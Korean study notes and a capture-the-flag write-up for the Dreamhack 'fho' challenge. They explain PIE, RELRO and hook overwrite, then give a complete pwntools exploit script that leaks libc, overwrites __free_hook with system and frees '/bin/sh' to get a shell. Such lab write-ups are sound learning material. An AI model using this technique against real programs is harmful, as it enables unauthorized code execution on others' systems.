- **상대 참조(Relative Addressing)**: 어떤 값을 기준으로 다른 주소를 지정하는 방식
- **Position Independent Code (PIC)**: 어떤 주소에 매핑되어도 실행 가능한 코드. 절대 주소를 사용하지 않으며 일반적으로 `rip`를 기준으로 한 상대 주소를 사용함.
- **Position Independent Executable (PIE)**: 어떤 주소에 매핑되어도 실행 가능한 실행 파일. PIE의 코드는 모두 PIC이다. 자체적으로 보호 기법은 아니지만 ASLR이 적용된 환경에서는 시스템을 더욱 안전하게 만드는 효과가 있음. 최신 gcc는 기본적으로 PIE 컴파일을 함.
- **Partial Overwrite**: 어떤 값을 일부분만 덮는 공격 방법. PIE를 우회하기 위해 사용될 수 있음.

//

- RELocation Read-Only(RELRO): 불필요한 데이터 영역에 쓰기 권한을 제거함.
- Partial RELRO: `init array`, `fini array` 등 여러 섹션에 쓰기 권한을 제거함. Lazy binding을 사용하므로 라이브러리 함수들의 GOT 엔트리는 쓰기가 가능함. GOT Overwrite등의 공격으로 우회가 가능함.
- Full RELRO: `init array`, `fini array` 뿐만 아니라 GOT에도 쓰기 권한을 제거함. Lazy binding을 사용하지 않으며 라이브러리 함수들의 주소는 바이너리가 로드되는 시점에 바인딩됨. `libc`의 malloc hook, free hook과 같은 함수 포인터를 조작하는 공격으로 우회할 수 있음.

//

fho 워게임

```bash
$ checksec fho
[*] '/home/hhro/dreamhack/fho'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

그동안 배운 모든 보호 기법이 적용.

## **코드 분석**

- L16:L19 매우 큰 스택 버퍼 오버플로우가 발생합니다. 그러나 알고 있는 정보가 없으므로 카나리를 올바르게 덮을 수 없고, 반환 주소도 유의미한 값으로 조작할 수 없습니다. 스택에 있는 데이터를 읽는 데 사용할 수 있을 것입니다.
- L21:L27 주소를 입력하고, 그 주소에 임의의 값을 쓸 수 있습니다.
- L29:L32 주소를 입력하고, 그 주소의 메모리를 해제할 수 있습니다.

## **공격 수단**

공격자는 다음 세 가지 수단(Primitive)을 이용하여 셸을 획득해야 합니다.

[1] 스택의 어떤 값을 읽을 수 있다.

[2] 임의 주소에 임의 값을 쓸 수 있다.

[3] 임의 주소를 해제할 수 있다.

## **1. 라이브러리의 변수 및 함수들의 주소 구하기**

`__free_hook` , `system` 함수, `“/bin/sh”` 문자열은 libc 파일에 정의되어 있으므로, 주어진 libc 파일로부터 이들의 오프셋을 얻을 수 있습니다.

## **2. 셸 획득**

앞서 익스플로잇에 필요한 변수와 함수의 주소를 구한 후 에서 `__free_hook` 의 값을 `system` 함수의 주소로 덮어쓰고, 에서 `“/bin/sh”` 를 해제(free)하게 하면 `system(“/bin/sh”)` 가 호출되어 셸을 획득할 수 있습니다.

# **익스플로잇 🎮**

## **1. 라이브러리의 변수 및 함수들의 주소 구하기**

`main` 함수의 반환 주소인 `libc_start_main+x`를 릭하여 libc 베이스 주소를 구하고 변수 및 함수들의 주소를 계산해보겠습니다.

`main` 함수는 라이브러리 함수인 `__libc_start_main`이 호출하므로, `main` 함수의 스택 프레임에는 `__libc_start_main+x`로 돌아갈 반환 주소가 저장되어 있을 것입니다. `__libc_start_main+x`는 libc 영역 어딘가에 존재하는 코드이므로, `__libc_start_main+x`의 주소를 릭한 후 해당 값에서 `libc_start_main+x`의 오프셋을 빼는 방식으로 프로세스 메모리에 매핑된 libc의 베이스 주소를 계산할 수 있습니다.

먼저 다음과 같이 gdb로 바이너리를 열고 `main` 함수에 중단점을 설정한 후 실행합니다. `main` 함수에서 멈추었을 때, 모든 스택 프레임의 백트레이스를 출력하는 `bt` 명령어로 `main` 함수의 반환 주소를 알아낼 수 있습니다.

```python
#!/usr/bin/env python3
# Name: fho.py

from pwn import *

p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
# 또는 libc_base = libc_start_main_xx - libc.libc_start_main_return
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

slog('libc_base', libc_base)
slog('system', system)
slog('free_hook', free_hook)
slog('/bin/sh', binsh)

# [2] Overwrite `free_hook` with `system`
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(system).encode())

# [3] Exploit
p.recvuntil('To free: ')
p.sendline(str(binsh).encode())

p.interactive()
```

쉘획득

- **Hooking**: 어떤 함수, 프로그램, 라이브러리를 실행하려 할 때 이를 가로채서 다른 코드가 실행되게 하는 기법. 디버깅, 모니터링, 트레이싱에 사용될 수 있으며, 공격자에 의해 키로깅이나 루트킷 제작에 사용될 수 있음.
- **Hook Overwrite**: 바이너리에 존재하는 훅을 덮어써서 특정 함수를 호출할 때, 악의적인 코드가 실행되게 하는 공격 기법. 메모리 관리와 관련된 `malloc`, `free`, `realloc`등의 함수가 라이브러리에 쓰기 가능한 훅 포인터를 가지고 있어서 공격에 사용될 수 있음. Full RELRO를 우회하는 데 사용될 수 있음.
- **원 가젯(one-gadget):** 실행하면 셸이 획득되는 코드 뭉치. **david942j**가 만들어놓은 툴을 사용하면 libc의 버전마다 유효한 원 가젯을 쉽게 찾을 수 있음.

![fho.jpg](https://github.com/JoWoonJi/Dreamhack_Wargame/blob/main/SystemHacking/img/fho.jpg)

플래그 획득
